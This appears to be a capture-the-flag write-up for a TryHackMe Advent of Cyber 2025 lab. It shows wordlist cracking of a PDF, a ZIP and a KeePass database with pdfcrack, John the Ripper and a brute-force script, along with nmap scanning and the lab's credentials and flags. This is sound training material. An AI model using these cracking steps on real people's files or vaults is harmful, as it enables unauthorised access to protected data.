
# 🔐 Day 09 – A Cracking Christmas

**Platform**: TryHackMe – *Advent of Cyber 2025*  
**Focus**: Password cracking (PDF, ZIP), side quest egg discovery, KeePass brute force

---

## 🧠 Target Info

```txt
Target Hostname: tryhackme
Target IP: 10.67.139.72
OS: Ubuntu 24.04.1 LTS/x86_64
```

---

## 👤 Credentials

```txt
Username: ubuntu
Password: AOC2025Ubuntu!
```

---

## 🏁 Flags

```txt
PDF Flag: THM{Cr4ck1ng_PDFs_1s_34$y}
ZIP Flag: THM{Cr4ck1n6_z1p$_1s_34$yyyy}
Side Quest Egg: tit_for_tat
```

---

## 🧰 Initial Access

```bash
ssh ubuntu@10.67.139.72
# Password: AOC2025Ubuntu!
```

```bash
ls -lah ~/Desktop/
# Contains:
# - flag.pdf
# - flag.zip
# - john/
```

---

## 🗃️ File Transfer to Local

```bash
scp flag* kali@<your_ip>:~/Day09
```

---

## 📄 PDF Cracking

```bash
pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt
# Output:
# found user-password: 'naughtylist'
```

✅ **Flag**: `THM{Cr4ck1ng_PDFs_1s_34$y}`

---

## 📦 ZIP Cracking (AES-encrypted)

```bash
zip2john flag.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
# Output:
# Password found: winter4ever
```

```bash
# unzip fails due to AES:
unzip flag.zip
# Use 7zip instead
7z x flag.zip
cat flag.txt
```

✅ **Flag**: `THM{Cr4ck1n6_z1p$_1s_34$yyyy}`

---

## 🎁 Side Quest Egg #2 (Extra Challenge)

```txt
Target IP: 10.67.134.25
```

### 🔍 Scan for Services

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',')
sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
```

Findings:
- TCP: `22`, `80`, `5901` (VNC)
- UDP: open|filtered results

---

### 🔐 SSH Access

```bash
ssh ubuntu@$ip
# Password: AOC2025Ubuntu!
```

---

### 🔍 Search for Clues

```bash
find / -type f -iname "sq*.png" 2>/dev/null
# No image found, but found:
# /home/ubuntu/.Passwords.kdbx
```

Copy it locally:

```bash
scp .Passwords.kdbx kali@<your_ip>:~/Day09/
```

---

## 🔓 Cracking KeePass (KDBX 4)

```bash
python3 -m venv keepass_crack
source keepass_crack/bin/activate
pip install pykeepass

git clone https://github.com/toneillcodes/brutalkeepass.git
cp brutalkeepass/bfkeepass.py .

python3 bfkeepass.py -d Passwords.kdbx -w /usr/share/wordlists/rockyou.txt -o
# Success! Database password: harrypotter
```

Open DB using **KeePassXC** or CLI. Inside:
- Entry title: `Key`
- Advanced attachment: `sq2.png`

✅ **Egg Found**: `tit_for_tat`

---

## ✅ Completion Timestamp

```txt
2026-01-02 23:14:50 EST -- COMPLETE
```
